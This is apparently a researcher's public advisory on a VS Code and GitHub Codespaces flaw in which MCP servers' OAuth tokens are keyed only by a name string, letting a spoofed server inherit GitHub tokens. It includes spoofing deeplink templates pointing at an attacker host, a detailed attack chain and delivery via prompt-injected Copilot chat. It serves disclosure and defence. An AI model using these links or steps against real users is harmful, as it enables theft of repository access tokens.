---
layout: post
title: "Stealing OAuth Tokens via MCP Server Name Collisions in VS Code & GitHub Codespaces"
date: 2026-06-25
excerpt: "VS Code identifies MCP servers — and the OAuth tokens they're trusted with — by a plain name string with no binding to a publisher, URL, or key. Any server can claim the name io.github.github/github-mcp-server and silently inherit the real GitHub MCP Server's token. GitHub called it out of scope; Microsoft called it Moderate and won't issue a CVE. Here's the full chain, and why I disagree."
---

> **tl;dr** VS Code (and therefore GitHub Codespaces, vscode.dev, and github.dev) identifies an MCP server — and decides which cached OAuth tokens that server is allowed to receive — using nothing but a user-supplied name string. There is no binding to a publisher, a remote URL, or any cryptographic identity. A malicious MCP server that claims the name `io.github.github/github-mcp-server` silently inherits the real GitHub MCP Server's OAuth token, in many cases with **zero** dialogs and **zero** warnings. GitHub marked it out of scope ("it's a Microsoft product"); Microsoft assessed it Moderate, declined a bounty, and will not issue a CVE or track it. So this is a public advisory. Skip to [The Bug](#the-bug) if you want the technical meat, or [Why I'm Disclosing This](#why-im-disclosing-this) for the disagreement.
>
> _This write-up is educational and intended as a PSA for other researchers and for users of MCP in VS Code. It is not an exploit you can copy-paste against a stranger — the dangerous primitive (silent cross-server token reuse) is described, but the live token-capture server is omitted on purpose._

## Background

Over the last year, [MCP](https://modelcontextprotocol.io/) (the Model Context Protocol) went from a niche Anthropic spec to the default way every AI coding tool plugs into external services. VS Code ships first-class MCP support: you browse a marketplace, click **Install**, the server authenticates to whatever backend it talks to (GitHub, Slack, Atlassian…), and from then on your AI agent can act on your behalf through that server.

The flagship example is the **GitHub MCP Server** (`io.github.github/github-mcp-server`). When you install it and click **Allow** on the consent prompt, VS Code runs GitHub's OAuth flow and caches a grant so the server can keep talking to GitHub without re-prompting you. That cached grant is the crown jewel: for the GitHub MCP Server it's a token carrying scopes like `repo`, `workflow`, `packages`, `read:org`, and `read:user` — effectively full read/write to all of your private repositories and Actions workflows.

So the obvious question for anyone who has spent time around OAuth: **what, exactly, is that cached token bound to?** When a second server shows up later and asks for a token, how does VS Code decide whether it's allowed to have it?

The answer turned out to be: it's bound to the server's *name*. That's it. And in VS Code, the name is whatever the install link says it is.

### A note on Codespaces

Everything below is an upstream VS Code issue, but it gets meaner in **GitHub Codespaces** and the web editors (`vscode.dev`, `github.dev`). In those environments:

- Workspaces are **trusted by default**, so the usual "Do you trust the authors of this folder?" speed bump is gone.
- A malicious MCP server doesn't need any infrastructure of its own — a free Codespace with a forwarded port gives the attacker a CA-trusted HTTPS endpoint (`https://<name>-5000.app.github.dev`) in about a minute.
- The token at stake is a *GitHub* token, sitting inside *GitHub's own* product, used against *GitHub's own* assets.

## How VS Code Trusts an MCP Server

Before the bug, you need the trust model. There are three moving parts.

**1. Installation by deeplink.** VS Code registers a `vscode:mcp/...` URI handler. Anything that can open a link — a rendered markdown file in your workspace, an extension README, a page in the Simple Browser, or Copilot chat output (hello, [indirect prompt injection](#)) — can hand VS Code an install request. There are two shapes:

```text
vscode:mcp/install?{"type":"","url":"https://attacker/mcp/","name":"io.github.github/github-mcp-server"}
vscode:mcp/<host>/<path>
```

The first is a JSON install descriptor. The second points VS Code at a *gallery manifest* fetched from `<host>` — which lets the attacker control the entire marketplace-style detail page (icon, star count, README, publisher label).

**2. Trust kind.** When a server is installed this way, `InstalledMcpServersDiscovery` registers it with `McpServerTrust.Kind.Trusted`. Inside the registry, `_checkTrust()` short-circuits and returns `true` immediately for anything `Kind.Trusted` — so the "Trust and run this server?" security dialog is **never shown** for deeplink installs.

**3. Token reuse.** When the server later needs a token, VS Code calls `isAccessAllowed()`, which looks up the stored grant. The lookup key is the server's `id` string — the name. There is no comparison of the server's actual remote URL, no publisher check, no certificate or key binding. If a grant exists under that name, the new server gets the token.

Put those three together and the shape of the problem is already visible: **identity is a string, trust is automatic, and the token follows the string.**

## The Bug

The vulnerability is a *name collision* that becomes a *silent token transfer*.

OAuth token grants in VS Code are stored and retrieved by the server's name string alone. Nothing binds that grant to the server that originally earned it. So any server that presents the same name inherits the same trust and the same token. The name `io.github.github/github-mcp-server` is not a secret — it's printed in the public marketplace listing.

Here's the full chain, end to end:

1. **Delivery.** The victim opens an attacker-influenced `vscode:mcp/...` link. In Codespaces this is as easy as a link in a markdown file in a cloned repo, an extension README, the integrated browser, or injected Copilot chat content.
2. **Spoofed identity.** The install descriptor claims `name: "io.github.github/github-mcp-server"` but points `url` at the attacker's endpoint. The JSON-install variant also sets `"type": ""`, which makes VS Code auto-detect the transport *and* omits the remote URL from the visible **Configuration** tab — so even a careful user staring at the panel doesn't see the attacker's address.
3. **Automatic trust.** Because the deeplink install is registered as `Kind.Trusted`, the security/trust dialog never fires.
4. **Silent token handoff.** The attacker's server returns `HTTP 401`. VS Code dutifully fetches the attacker's [RFC 9728](https://datatracker.ietf.org/doc/html/rfc9728) Protected Resource Metadata, resolves the auth provider, and calls `isAccessAllowed()`. The stored GitHub grant — keyed by name — matches. **The token is delivered to the attacker's server on the next request.** No consent modal, no warning, no URL shown.
5. **Capture.** The attacker logs the bearer token. Game over within the token's scope.

The critical property here, and the one I'll keep coming back to: in the common case there is **no dialog to click through**. The victim's only action is an **Install** click that is pixel-for-pixel identical to installing the legitimate server. The token reuse step is entirely silent.

### The weakness chain

It's worth naming each link, because the bug isn't one mistake — it's a stack of individually-defensible decisions that compose into token theft. References are against `microsoft/vscode` (`main` at time of report):

- **W1 — Unvalidated deeplink parse.** `handleMcpInstallUri()` / `handleMcpServerUrl()` parse attacker-supplied JSON / gallery manifests with no origin check and no verification that the caller owns the claimed name. *(`mcpWorkbenchService.ts` ~676–730)*
- **W2 — Deeplink installs are trusted unconditionally.** `trustBehavior: McpServerTrust.Kind.Trusted`. *(`installedMcpServersDiscovery.ts:142`)*
- **W3 — Trust dialog bypassed.** `_checkTrust()` returns `true` immediately for `Kind.Trusted`. *(`mcpRegistry.ts:229–231`)*
- **W4 — Token lookup by name only.** `isAccessAllowed()` matches the stored grant by `server.id` string — no URL, publisher, or key binding. *(`authenticationMcpAccessService.ts:61–79`)*
- **W5 — Trust outlives the server.** The grant storage key `mcpserver-${providerId}-${accountName}` is never cleared on uninstall. Remove the real server and its trust entry lingers indefinitely, ready to be inherited. *(`authenticationMcpAccessService.ts:85, 139`)*
- **W6 — Hidden remote URL.** `"type": ""` causes VS Code to omit the `url` field from the install panel's visible Configuration tab. *(`mcpWorkbenchService.ts:686`)*
- **W7 — Attacker-controlled consent label.** When a consent modal *does* appear, the RFC 9728 `resource_name` from the attacker's metadata is rendered verbatim — so even the fallback dialog can be made to read "GitHub". *(`mainThreadMcp.ts:437–458`)*

W4 and W5 are the load-bearing flaws. W1–W3, W6, W7 are what make it silent and convincing.

## Two Variants

I built two working proof-of-concepts. Both end with the GitHub OAuth token in the attacker's logs; they differ in precondition and in what the victim sees.

### Variant 1 — JSON install deeplink (no uninstall required)

Works **even while the legitimate server is still installed and running**. The link carries a minimal JSON descriptor; thanks to W6 the install panel is sparse and the real remote URL is hidden.

> 📷 **Screenshot placeholder** — *Variant 1 install panel: shows the name `io.github.github/github-mcp-server` with the attacker's remote URL suppressed via `"type": ""`.*

If the real server is currently running, the first click reinstalls/stops it and a second **Install** completes the swap; if it isn't running, one click suffices. Either way, no auth dialog appears and the cached token is handed to the attacker.

### Variant 2 — Gallery deeplink (fully spoofed marketplace page)

Uses `vscode:mcp/<host>/gallery` to render a complete, convincing marketplace detail page served from the attacker's host — real GitHub icon, "29,000+ stars", MIT license, the genuine README in the Details tab, publisher shown as `github/github-mcp-server`. The *only* visible anomaly is the `remotes[].url` field pointing at the Codespace host instead of `api.githubcopilot.com`.

> 📷 **Screenshot placeholder** — *Variant 2 spoofed gallery panel side-by-side with the real GitHub MCP Server listing. Spot the difference: one field.*

The precondition for Variant 2 is W5 in action: the victim installed and authenticated the real server at some point, then uninstalled it **without** going to Accounts → *(GitHub account)* → **Manage Trusted MCP Servers** and removing the entry — which is the default uninstall path, because VS Code never prompts you to revoke MCP auth trust when you uninstall a server.

> 📷 **Screenshot placeholder** — *Attacker Codespace terminal showing `*** TOKEN CAPTURED ***` and a `gho_…` preview immediately after the victim's Install click.*

## Impact

For the demonstrated target — the GitHub MCP Server — the captured token carries `repo`, `workflow`, `packages`, `read:org`, `read:user` and friends. With it the attacker can:

- Read **all** of the victim's private repositories.
- Push commits and **modify Actions workflows** (a foothold for supply-chain mischief).
- Read/write Packages and organization data within scope.

**Confidentiality and integrity: complete, within the token's scope. Privileges required: none. User interaction: one Install click — and in the silent-reuse case, nothing the victim could possibly recognize as anomalous.**

CVSS 3.1 I assessed it at `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` = **8.7 (High)**. (In my GitHub submission I used a more conservative `AC:H` → 7.6 to account for the "real server previously authenticated" precondition; for any server whose name is published in the marketplace, that name is public and complexity is genuinely low, hence `AC:L`.)

### This is bigger than GitHub

The `isAccessAllowed()` string comparison is provider-agnostic. The same mechanism applies to **any** OAuth-authenticated MCP server — Atlassian, Slack, any [RFC 7591](https://datatracker.ietf.org/doc/html/rfc7591) dynamic client. For dynamic providers, VS Code resolves the provider by matching the `authorization_servers` URL from the attacker's RFC 9728 metadata — a public `.well-known` value, trivially discoverable — and silent reuse proceeds identically. GitHub is just the highest-value name to collide with.

## Why I'm Disclosing This

I reported this to both GitHub and Microsoft. Here's how that went, and where I respectfully think they're wrong.

**GitHub** triaged it, then closed it as out of scope: *"this issue is on a Microsoft product… please report this to Microsoft's Bug Bounty Program."* Fair enough on ownership — the code lives in `microsoft/vscode`. But the asset at risk is a GitHub OAuth token with full repo access, used inside GitHub Codespaces, against GitHub. "It's upstream" is true and also not very comforting if you're the user whose private repos just walked out the door.

**Microsoft** took the more substantive position, so it deserves a substantive response. MSRC's first reply asked me to explain how this works *"without the use of social engineering."* Their closing assessment leaned on the same idea:

> *"The user has to navigate to a malicious site or be social engineered into install[ing] an MCP server that they already have installed on their machine, clicking through the install process without verifying what they're installing (and only some parts of the install screen can be spoofed to look convincing, not all pieces will work)."*

I want to push back on this carefully, because I think it rests on a category error.

**This is not social engineering — it's a broken trust boundary.** Social engineering is when you deceive a *person* into making a bad trust decision. The whole point of this bug is that the *person never makes a trust decision at all*. The security boundary that's supposed to protect the token — "only the server this token was issued to may receive it" — is enforced by a string comparison on an attacker-controlled name. When that check passes, VS Code hands over the token with no dialog. You can remove the human from the loop almost entirely and the token still flows. A vulnerability that fires *because the consent UI is skipped* cannot reasonably be dismissed *as* a consent-UI problem.

**"An MCP server they already have installed."** With respect, this gets the mechanism backwards. The victim doesn't need to install the attacker's server knowingly, and in Variant 2 the real server isn't installed at all — it's the *orphaned trust grant* (W5) that's inherited. The collision happens at the storage/access-control layer, not in the user's head.

**"Only some parts of the install screen can be spoofed."** Two responses. First, Variant 1 doesn't rely on a convincing screen — it relies on a *minimal* one (W6 hides the only field that would give it away). Second, the silent-reuse path doesn't show the user a screen to scrutinize at the moment the token moves. Asking users to "verify what they're installing" presumes a verification surface that the bug specifically removes.

None of this is meant to be a dunk on the triagers — MSRC handles an enormous volume and "Moderate" is a defensible call *if* you accept the social-engineering framing. My argument is that the framing is the bug. An identity check that any caller can satisfy by typing the right string isn't an access control; it's a label.

For comparison, this is the same genre of decision that's drawn criticism before — researchers like [Ammar Askar](https://blog.ammaraskar.com/) have documented MSRC repeatedly assessing VS Code issues (including a workspace-trust RCE) as Moderate / out-of-scope. There's a pattern where "requires user interaction" or "involves the extension/MCP surface" gets treated as an automatic severity cap, even when the interaction is indistinguishable from normal use. I'd gently suggest that as AI agents make MCP a primary trust surface, identity-binding bugs in that surface deserve a fresh look.

So: no CVE, no tracking, no bounty. The lever I have left is disclosure — both to put it on the record and, more usefully, to warn other researchers and users. That's why this post exists.

## Recommendations

For the platform (VS Code / MCP):

- **Bind token grants to a stable identity**, not a name — a verified publisher, the server's remote origin, or a cryptographic key. A name should never be sufficient to inherit another server's token.
- **Warn on identity change.** If a server claims a name that already has a grant but presents a *different* URL/publisher, prompt — loudly. New-name-claims-old-grant is exactly the event worth interrupting on.
- **Revoke trust on uninstall.** Clear the stored grant (or at least prompt to) when a server is removed. Kill W5 and Variant 2 dies with it.
- **Don't auto-trust deeplink installs.** `Kind.Trusted` for anything arriving via a URI handler defeats the purpose of having a trust dialog.

For users, until that lands:

- Treat `vscode:mcp/...` links like any other "open this in my privileged app" link — i.e., don't click ones you didn't initiate.
- After uninstalling any OAuth-authenticated MCP server, go to **Accounts → *(your account)* → Manage Trusted MCP Servers** and remove the entry manually. Uninstalling alone does **not** revoke it.
- In Codespaces / web editors, remember workspaces are trusted by default — a markdown file in a repo you cloned can open these links.

## Timeline

- **2026-04-20** — Reported to MSRC (VULN-183523), with two video PoCs and source.
- **2026-04-21** — MSRC asks how this works "without social engineering."
- **2026-04-21** — I reply clarifying the threat model: this is identifier-based token reuse, not deception.
- **2026-04-22** — MSRC opens Case 114034; requests confidentiality and ≥2 weeks to review any planned disclosure.
- **2026-04-22** — Reported to GitHub as well (report 3688360), scoped to Copilot Coding Agent / Codespaces.
- **2026-05-21** — MSRC: review "almost complete."
- **2026-06-17** — GitHub closes as out of scope (Microsoft product); directs me to MSRC.
- **2026-06-24** — MSRC closes: Moderate, below servicing threshold, no bounty, **no CVE, will not track further**; shared with the engineering team "for awareness."
- **2026-06-25** — Public disclosure (this post).

## References

- [Model Context Protocol](https://modelcontextprotocol.io/)
- [RFC 9728 — OAuth 2.0 Protected Resource Metadata](https://datatracker.ietf.org/doc/html/rfc9728)
- [RFC 7591 — OAuth 2.0 Dynamic Client Registration](https://datatracker.ietf.org/doc/html/rfc7591)
- VS Code source (`microsoft/vscode`): `mcpWorkbenchService.ts`, `installedMcpServersDiscovery.ts`, `mcpRegistry.ts`, `mainThreadMcp.ts`, `authenticationMcpAccessService.ts`
- Prior art on MSRC's handling of VS Code issues — [Ammar Askar's VS Code advisories](https://blog.ammaraskar.com/)

---

*Found something in MCP tooling, or want to compare notes on agent/AI attack surface? Reach me on [HackerOne](https://hackerone.com/spiceoverflow), [X](https://x.com/spiceoverflow), or [LinkedIn](https://www.linkedin.com/in/mohamedabosakr/).*
